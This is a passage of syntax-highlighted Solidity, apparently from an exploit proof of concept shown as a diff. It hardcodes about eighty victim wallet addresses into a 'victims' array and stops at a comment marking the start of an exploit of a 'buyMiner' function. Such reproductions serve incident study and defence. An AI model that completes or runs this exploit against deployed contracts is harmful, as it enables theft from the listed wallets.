+</span><span id="__span-1-71"><a id="__codelineno-1-71" name="__codelineno-1-71" href="#__codelineno-1-71"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">19</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0xC02eb88068A40aEe6E4649bDc940e0f792e16C22</span><span class="p">;</span>
+</span><span id="__span-1-72"><a id="__codelineno-1-72" name="__codelineno-1-72" href="#__codelineno-1-72"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">20</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0xa2D5b4de4cb10043D190aae23D1eFC02E31F1Cb6</span><span class="p">;</span>
+</span><span id="__span-1-73"><a id="__codelineno-1-73" name="__codelineno-1-73" href="#__codelineno-1-73"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">21</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x5E05B8aC4494476Dd539e0F4E1302806ec52ED6F</span><span class="p">;</span>
+</span><span id="__span-1-74"><a id="__codelineno-1-74" name="__codelineno-1-74" href="#__codelineno-1-74"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">22</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0xDeb6FDCa49e54c8b0704C5B3f941ED6319139816</span><span class="p">;</span>
+</span><span id="__span-1-75"><a id="__codelineno-1-75" name="__codelineno-1-75" href="#__codelineno-1-75"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">23</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x0E6533B8d6937cC8b4c9be31c00acBfaCB6760a5</span><span class="p">;</span>
+</span><span id="__span-1-76"><a id="__codelineno-1-76" name="__codelineno-1-76" href="#__codelineno-1-76"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">24</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0xCE0Fd72a7cF07EB9B20562bbb142Cb711A42867f</span><span class="p">;</span>
+</span><span id="__span-1-77"><a id="__codelineno-1-77" name="__codelineno-1-77" href="#__codelineno-1-77"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">25</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x4868725bf6D395148def99E6C43074C774e7AC1D</span><span class="p">;</span>
+</span><span id="__span-1-78"><a id="__codelineno-1-78" name="__codelineno-1-78" href="#__codelineno-1-78"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">26</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x2F1f2BAF34703d16BcfD62cF64A7A5a44Ad6c9d4</span><span class="p">;</span>
+</span><span id="__span-1-79"><a id="__codelineno-1-79" name="__codelineno-1-79" href="#__codelineno-1-79"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">27</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x3d49Bdf065f009621A02c5Fd88f72ed0A3910521</span><span class="p">;</span>
+</span><span id="__span-1-80"><a id="__codelineno-1-80" name="__codelineno-1-80" href="#__codelineno-1-80"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">28</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x6E31C08f1938BE5DF98F8968747bB34802D76E50</span><span class="p">;</span>
+</span><span id="__span-1-81"><a id="__codelineno-1-81" name="__codelineno-1-81" href="#__codelineno-1-81"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">29</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x4F741D8DCDEdd74DadeA6cd3A7e41ECb28076209</span><span class="p">;</span>
+</span><span id="__span-1-82"><a id="__codelineno-1-82" name="__codelineno-1-82" href="#__codelineno-1-82"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">30</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x5480c14b9841C89527F0D1A55dDC0D273Aae3609</span><span class="p">;</span>
+</span><span id="__span-1-83"><a id="__codelineno-1-83" name="__codelineno-1-83" href="#__codelineno-1-83"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">31</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0xb3725dA113eFFd7F39BE62A5E349f26e82a949fF</span><span class="p">;</span>
+</span><span id="__span-1-84"><a id="__codelineno-1-84" name="__codelineno-1-84" href="#__codelineno-1-84"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">32</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x9d83Dee089a5fBfB5F2F1268EDB80aeA8Ba5aF16</span><span class="p">;</span>
+</span><span id="__span-1-85"><a id="__codelineno-1-85" name="__codelineno-1-85" href="#__codelineno-1-85"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">33</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x0c02F3d6962245E934A3fe415EAbA6bf570c1883</span><span class="p">;</span>
+</span><span id="__span-1-86"><a id="__codelineno-1-86" name="__codelineno-1-86" href="#__codelineno-1-86"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">34</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x0182cfEFB268DD510ee77F32527578BEAC6238e2</span><span class="p">;</span>
+</span><span id="__span-1-87"><a id="__codelineno-1-87" name="__codelineno-1-87" href="#__codelineno-1-87"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">35</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x78598Ac3943454682477852E846532F73d5cFE5F</span><span class="p">;</span>
+</span><span id="__span-1-88"><a id="__codelineno-1-88" name="__codelineno-1-88" href="#__codelineno-1-88"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">36</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0xd067c7585425e1e5AA98743BdA5fB65212751476</span><span class="p">;</span>
+</span><span id="__span-1-89"><a id="__codelineno-1-89" name="__codelineno-1-89" href="#__codelineno-1-89"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">37</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x3507ddF8b74dAEd03fE76EE74B7d6544F3B254B7</span><span class="p">;</span>
+</span><span id="__span-1-90"><a id="__codelineno-1-90" name="__codelineno-1-90" href="#__codelineno-1-90"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">38</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0xEca4Fd6b05E5849aAf5F2bEE5Eb3B50f8C4f4E3c</span><span class="p">;</span>
+</span><span id="__span-1-91"><a id="__codelineno-1-91" name="__codelineno-1-91" href="#__codelineno-1-91"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">39</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0xAA279af072080f3e453A916b77862b4ff6eB245E</span><span class="p">;</span>
+</span><span id="__span-1-92"><a id="__codelineno-1-92" name="__codelineno-1-92" href="#__codelineno-1-92"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">40</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x4e505a21325A6820E2099Bbd15f6832c6f696a3c</span><span class="p">;</span>
+</span><span id="__span-1-93"><a id="__codelineno-1-93" name="__codelineno-1-93" href="#__codelineno-1-93"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">41</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0xA5b63F7b40A5Cc5ee6B9dB7cef2415699627Ee89</span><span class="p">;</span>
+</span><span id="__span-1-94"><a id="__codelineno-1-94" name="__codelineno-1-94" href="#__codelineno-1-94"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">42</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x3dd624cEd432DDc32fA0afDaE855b76aa1431644</span><span class="p">;</span>
+</span><span id="__span-1-95"><a id="__codelineno-1-95" name="__codelineno-1-95" href="#__codelineno-1-95"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">43</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x17f217Fdeff7Ee4a81a4b2f42c695EDC20806957</span><span class="p">;</span>
+</span><span id="__span-1-96"><a id="__codelineno-1-96" name="__codelineno-1-96" href="#__codelineno-1-96"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">44</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x41819F36878d15A776225928CD52DC56acCFD553</span><span class="p">;</span>
+</span><span id="__span-1-97"><a id="__codelineno-1-97" name="__codelineno-1-97" href="#__codelineno-1-97"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">45</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x61ca76703C5aF052c9b0aCc2Bab0276875DDd328</span><span class="p">;</span>
+</span><span id="__span-1-98"><a id="__codelineno-1-98" name="__codelineno-1-98" href="#__codelineno-1-98"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">46</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x2956bCc87450B424C7305C4c6CF771196c23A52E</span><span class="p">;</span>
+</span><span id="__span-1-99"><a id="__codelineno-1-99" name="__codelineno-1-99" href="#__codelineno-1-99"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">47</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x03be05224803c89f3b8C806d887fD84A20D16e5C</span><span class="p">;</span>
+</span><span id="__span-1-100"><a id="__codelineno-1-100" name="__codelineno-1-100" href="#__codelineno-1-100"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">48</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x3C97320bf030C2c120FdCe19023A571f3fbB6184</span><span class="p">;</span>
+</span><span id="__span-1-101"><a id="__codelineno-1-101" name="__codelineno-1-101" href="#__codelineno-1-101"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">49</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0xc52021150ca5c32253220bE328ddC05F86d3a619</span><span class="p">;</span>
+</span><span id="__span-1-102"><a id="__codelineno-1-102" name="__codelineno-1-102" href="#__codelineno-1-102"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">50</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x6d7aAa35c4B2dBD6F1E979e04884AeE1B4FBB407</span><span class="p">;</span>
+</span><span id="__span-1-103"><a id="__codelineno-1-103" name="__codelineno-1-103" href="#__codelineno-1-103"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">51</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x7c80162197607312EC99d7c9e34720B3572d6D16</span><span class="p">;</span>
+</span><span id="__span-1-104"><a id="__codelineno-1-104" name="__codelineno-1-104" href="#__codelineno-1-104"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">52</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x15D92C909826017Ff0184eea3e38c36489517A7C</span><span class="p">;</span>
+</span><span id="__span-1-105"><a id="__codelineno-1-105" name="__codelineno-1-105" href="#__codelineno-1-105"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">53</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0xC07fa7a1F14A374d169Dc593261843B4A6d9C1C3</span><span class="p">;</span>
+</span><span id="__span-1-106"><a id="__codelineno-1-106" name="__codelineno-1-106" href="#__codelineno-1-106"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">54</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x4b415F48FA70a9a0050F6380e843790260973808</span><span class="p">;</span>
+</span><span id="__span-1-107"><a id="__codelineno-1-107" name="__codelineno-1-107" href="#__codelineno-1-107"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">55</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x9CeEeB927b85d4bD3b4e282c17EB186bCDC4Dd15</span><span class="p">;</span>
+</span><span id="__span-1-108"><a id="__codelineno-1-108" name="__codelineno-1-108" href="#__codelineno-1-108"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">56</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x0eb76DAf60bdF637FC207BFb545B546D5Ee208B1</span><span class="p">;</span>
+</span><span id="__span-1-109"><a id="__codelineno-1-109" name="__codelineno-1-109" href="#__codelineno-1-109"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">57</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x96D7F1660e708eDdF2b6f655ADB61686B59bC190</span><span class="p">;</span>
+</span><span id="__span-1-110"><a id="__codelineno-1-110" name="__codelineno-1-110" href="#__codelineno-1-110"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">58</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0xDCeB637E38dBae685222eEf6635095AaaEC65496</span><span class="p">;</span>
+</span><span id="__span-1-111"><a id="__codelineno-1-111" name="__codelineno-1-111" href="#__codelineno-1-111"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">59</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x36083Aac533353317C24Bd53227DbF29Ed9F384c</span><span class="p">;</span>
+</span><span id="__span-1-112"><a id="__codelineno-1-112" name="__codelineno-1-112" href="#__codelineno-1-112"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">60</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x94913f31fBaFcb0ae6e5EfA4C18E3ee301097eab</span><span class="p">;</span>
+</span><span id="__span-1-113"><a id="__codelineno-1-113" name="__codelineno-1-113" href="#__codelineno-1-113"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">61</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x188c50F43f9fA0026BAaa7d8cF83c358311f0500</span><span class="p">;</span>
+</span><span id="__span-1-114"><a id="__codelineno-1-114" name="__codelineno-1-114" href="#__codelineno-1-114"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">62</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x3d8dcC70777643612564D84176f769A1417987a5</span><span class="p">;</span>
+</span><span id="__span-1-115"><a id="__codelineno-1-115" name="__codelineno-1-115" href="#__codelineno-1-115"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">63</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x00273CEEe956543c801429A886cD0E1a79f5d8cA</span><span class="p">;</span>
+</span><span id="__span-1-116"><a id="__codelineno-1-116" name="__codelineno-1-116" href="#__codelineno-1-116"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">64</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0xC43C5F785D06b582E3E710Dc0156267Fd135C602</span><span class="p">;</span>
+</span><span id="__span-1-117"><a id="__codelineno-1-117" name="__codelineno-1-117" href="#__codelineno-1-117"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">65</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x0406aefd83f20700D31a49F3d6fdbF52e8F7D0Ef</span><span class="p">;</span>
+</span><span id="__span-1-118"><a id="__codelineno-1-118" name="__codelineno-1-118" href="#__codelineno-1-118"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">66</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0xBeD8C7433dE90D349f96C6AE82d4eb4482AA6Bf7</span><span class="p">;</span>
+</span><span id="__span-1-119"><a id="__codelineno-1-119" name="__codelineno-1-119" href="#__codelineno-1-119"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">67</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0xDe436F7742cE08f843f8d84e7998E0B7e4b73101</span><span class="p">;</span>
+</span><span id="__span-1-120"><a id="__codelineno-1-120" name="__codelineno-1-120" href="#__codelineno-1-120"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">68</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0xd38c6E26aa4888DE59C2EAaD6138B0b66ABBF21D</span><span class="p">;</span>
+</span><span id="__span-1-121"><a id="__codelineno-1-121" name="__codelineno-1-121" href="#__codelineno-1-121"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">69</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0xc0dFb3219F0C72E902544a080ba0086da53F9599</span><span class="p">;</span>
+</span><span id="__span-1-122"><a id="__codelineno-1-122" name="__codelineno-1-122" href="#__codelineno-1-122"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">70</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0xFAAD61bd6b509145c2988B03529fF21F3C9970B2</span><span class="p">;</span>
+</span><span id="__span-1-123"><a id="__codelineno-1-123" name="__codelineno-1-123" href="#__codelineno-1-123"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">71</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x9f9BEEF87Cfe141868E21EacbDDB48DF6c54C2F2</span><span class="p">;</span>
+</span><span id="__span-1-124"><a id="__codelineno-1-124" name="__codelineno-1-124" href="#__codelineno-1-124"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">72</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x6614e2e86b4646793714B1fa535fc5875bB446d5</span><span class="p">;</span>
+</span><span id="__span-1-125"><a id="__codelineno-1-125" name="__codelineno-1-125" href="#__codelineno-1-125"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">73</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x7eFe3780b1b0cde8F300443fbb4C12a73904a948</span><span class="p">;</span>
+</span><span id="__span-1-126"><a id="__codelineno-1-126" name="__codelineno-1-126" href="#__codelineno-1-126"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">74</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0xAd813b95A27233E7Abd92C62bBa87f59Ca8F9339</span><span class="p">;</span>
+</span><span id="__span-1-127"><a id="__codelineno-1-127" name="__codelineno-1-127" href="#__codelineno-1-127"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">75</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x13F33854cE08e07D20F5C0B16884267dde21a501</span><span class="p">;</span>
+</span><span id="__span-1-128"><a id="__codelineno-1-128" name="__codelineno-1-128" href="#__codelineno-1-128"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">76</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x59ebcde7Ec542b5198095917987755727725fD1d</span><span class="p">;</span>
+</span><span id="__span-1-129"><a id="__codelineno-1-129" name="__codelineno-1-129" href="#__codelineno-1-129"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">77</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0xe5A5B86119BD9fd4DF5478AbE1d3D9F46BF3Ba5F</span><span class="p">;</span>
+</span><span id="__span-1-130"><a id="__codelineno-1-130" name="__codelineno-1-130" href="#__codelineno-1-130"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">78</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0xC2724ed2B629290787Eb4A91f00aAFE58F262025</span><span class="p">;</span>
+</span><span id="__span-1-131"><a id="__codelineno-1-131" name="__codelineno-1-131" href="#__codelineno-1-131"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">79</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0xDFa225eB03F9cc2514361A044EDDA777eA51b9ad</span><span class="p">;</span>
+</span><span id="__span-1-132"><a id="__codelineno-1-132" name="__codelineno-1-132" href="#__codelineno-1-132"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">80</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x85d981E3CDdb402F9Ae96948900971102Ee5d6b5</span><span class="p">;</span>
+</span><span id="__span-1-133"><a id="__codelineno-1-133" name="__codelineno-1-133" href="#__codelineno-1-133"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">81</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0xb0Ac3A88bFc919cA189f7d4AbA8e2F191b37A65B</span><span class="p">;</span>
+</span><span id="__span-1-134"><a id="__codelineno-1-134" name="__codelineno-1-134" href="#__codelineno-1-134"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">82</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x1A906A9A385132D6B1a62Bb8547fD20c38dd79Bb</span><span class="p">;</span>
+</span><span id="__span-1-135"><a id="__codelineno-1-135" name="__codelineno-1-135" href="#__codelineno-1-135"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">83</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x9d36C7c400e033aeAc391b24F47339d7CB7bc033</span><span class="p">;</span>
+</span><span id="__span-1-136"><a id="__codelineno-1-136" name="__codelineno-1-136" href="#__codelineno-1-136"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">84</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x5B19C1F57b227C67Bef1e77b1B6796eF22aEe21B</span><span class="p">;</span>
+</span><span id="__span-1-137"><a id="__codelineno-1-137" name="__codelineno-1-137" href="#__codelineno-1-137"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">85</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0xbfd0785a924c3547544C95913dAC0b119865DF9e</span><span class="p">;</span>
+</span><span id="__span-1-138"><a id="__codelineno-1-138" name="__codelineno-1-138" href="#__codelineno-1-138"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">86</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0xF003E6430fbC1194ffA3419629A389B7C113F083</span><span class="p">;</span>
+</span><span id="__span-1-139"><a id="__codelineno-1-139" name="__codelineno-1-139" href="#__codelineno-1-139"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">87</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0xfa30Cd705eE0908e2Dac4C19575F824DED99818E</span><span class="p">;</span>
+</span><span id="__span-1-140"><a id="__codelineno-1-140" name="__codelineno-1-140" href="#__codelineno-1-140"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">88</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0xe27027B827FE2FBcFCb56269d4463881AA6B8955</span><span class="p">;</span>
+</span><span id="__span-1-141"><a id="__codelineno-1-141" name="__codelineno-1-141" href="#__codelineno-1-141"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">89</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0xEddD7179E461F42149104DCb87F3b5b657a05399</span><span class="p">;</span>
+</span><span id="__span-1-142"><a id="__codelineno-1-142" name="__codelineno-1-142" href="#__codelineno-1-142"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">90</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x980FcDB646c674FF9B6621902aCB8a4012974093</span><span class="p">;</span>
+</span><span id="__span-1-143"><a id="__codelineno-1-143" name="__codelineno-1-143" href="#__codelineno-1-143"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">91</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x2eBc77934935980357A894577c2CC7107574f971</span><span class="p">;</span>
+</span><span id="__span-1-144"><a id="__codelineno-1-144" name="__codelineno-1-144" href="#__codelineno-1-144"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">92</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x798435DE8fA75993bFC9aD84465d7F812507b604</span><span class="p">;</span>
+</span><span id="__span-1-145"><a id="__codelineno-1-145" name="__codelineno-1-145" href="#__codelineno-1-145"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">93</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x1Be117F424e9e6f845F7b07C072c1d67F114f885</span><span class="p">;</span>
+</span><span id="__span-1-146"><a id="__codelineno-1-146" name="__codelineno-1-146" href="#__codelineno-1-146"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">94</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x434e921bDFe74605BD2AAbC2f6389dDBA2d37ACA</span><span class="p">;</span>
+</span><span id="__span-1-147"><a id="__codelineno-1-147" name="__codelineno-1-147" href="#__codelineno-1-147"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">95</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0xaFacAc64426D1cE0512363338066cc8cABB3AEa2</span><span class="p">;</span>
+</span><span id="__span-1-148"><a id="__codelineno-1-148" name="__codelineno-1-148" href="#__codelineno-1-148"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">96</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x2693e0A37Ea6e669aB43dF6ee68b453F6D6F3EBD</span><span class="p">;</span>
+</span><span id="__span-1-149"><a id="__codelineno-1-149" name="__codelineno-1-149" href="#__codelineno-1-149"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">97</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x77Aee2AAc9881F4A4C347eb94dEd088aD49C574D</span><span class="p">;</span>
+</span><span id="__span-1-150"><a id="__codelineno-1-150" name="__codelineno-1-150" href="#__codelineno-1-150"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">98</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x951f4785A2A61fe8934393e0ff6513D6946D8d97</span><span class="p">;</span>
+</span><span id="__span-1-151"><a id="__codelineno-1-151" name="__codelineno-1-151" href="#__codelineno-1-151"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">99</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x2051cE514801167545E74b5DD2a8cF5034c6b17b</span><span class="p">;</span>
+</span><span id="__span-1-152"><a id="__codelineno-1-152" name="__codelineno-1-152" href="#__codelineno-1-152"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">100</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0xC2EE820756d4074d887d762Fd8F70c4Fc47Ab47f</span><span class="p">;</span>
+</span><span id="__span-1-153"><a id="__codelineno-1-153" name="__codelineno-1-153" href="#__codelineno-1-153"></a>
+</span><span id="__span-1-154"><a id="__codelineno-1-154" name="__codelineno-1-154" href="#__codelineno-1-154"></a><span class="w">        </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">loss</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m m-Decimal">0</span><span class="p">;</span>
+</span><span id="__span-1-155"><a id="__codelineno-1-155" name="__codelineno-1-155" href="#__codelineno-1-155"></a><span class="w">        </span><span class="c1">// start exploit buyMiner function</span>
